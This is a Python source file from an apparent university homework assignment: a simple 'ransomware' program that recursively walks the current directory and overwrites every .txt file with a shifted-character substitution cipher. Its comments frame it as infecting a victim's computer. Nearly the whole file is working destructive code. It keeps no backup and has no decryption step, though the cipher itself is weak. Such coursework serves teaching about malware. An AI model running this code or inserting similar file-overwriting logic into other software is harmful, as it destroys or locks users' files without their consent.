#!/usr/bin/env python3

#CS377 Homework
#
#To run file in linux "python3 encrypt.py"
#This program will look for all text file within the current directory and encrypt it



#TO DO LIST:
#   1.Your Ransomware should be able to infect entire recursive directories on a Linux platform
#       a. Need to make it recursive to all directories
#   2.You may make the simplifying assumption that the victim’s computer has only text files, for example
#   3. Also, assume that your Ransomware somehow finds its way onto the victim’s computer.

#COMPLETED:
#   1.Start by implementing a not-so-simple substitution crypto algorithm
#   2.You will need to expand on what we covered in class to cover things like, space, tab, and punctuation.
#   3.Then, use this algorithm to encrypt the victim’s files
#   4.For now I have kept space, newline, and tab as is. Will probably need to encrypt it to a symbol or seomthing

import sys
import os


#Function to check number with its corresponding unicode
def printchr():
    for x in range(150):
        print(x, ":", chr(x))

#Function to encrypt data within text file
def encrypt(text):
    #How many shifts in the alphabet
    key = 5
    encryptData = ""

    #Open file and read the data in the file char by char
    #and encrypt the char one at a time and append it to string encryptData
    #Once we are finish encrypting we will write the encrypted data to the files
    #And replace the previous text
    file = open(text, "r")

    for line in file:
        for character in line:
            #Check if char is upper
            if(character.isupper()):
                encryptData += chr((ord(character) + key - 65) % 26 + 65)
            #Check if char is upper
            elif(character.islower()):
                encryptData += chr((ord(character) + key - 97) % 26 + 97)
            elif(33 <= ord(character) <= 64):
                encryptData += chr((ord(character) + key - 33) % 32 + 33)
            elif(91 <= ord(character) <= 96):
                encryptData += chr((ord(character) + key - 91) % 6 + 91)
            elif(123 <= ord(character) <= 126):
                encryptData += chr((ord(character) + key - 123) % 4 + 123)
            elif(character == " "):
                print("#To do(Space)")
                encryptData += chr((ord(character)))
            elif(character == "\n"):
                print("#To do(Newline)")
                encryptData += chr((ord(character)))
            elif(character == "\t"):
                print("#To do(Tab)")
                encryptData += chr((ord(character)))

    file.close()
    print(encryptData)

    print("--------------------------")

    encryptFile = open(text, "w")
    encryptFile.write(encryptData)
    encryptFile.close()


#printchr()
'''
def testEncrypt(path):
    encrypt(path)
'''


def main(path):
    file = os.listdir(path)
    if len(file) > 0:
        for item in file:
            if item.endswith('.txt'):
                encrypt(path + "/" + item)
            elif os.path.isdir(path + "/" + item):
                main(path + "/" + item)


if __name__ == "__main__":
    main(os.getcwd())
    #testEncrypt(os.getcwd() + "/test.txt")
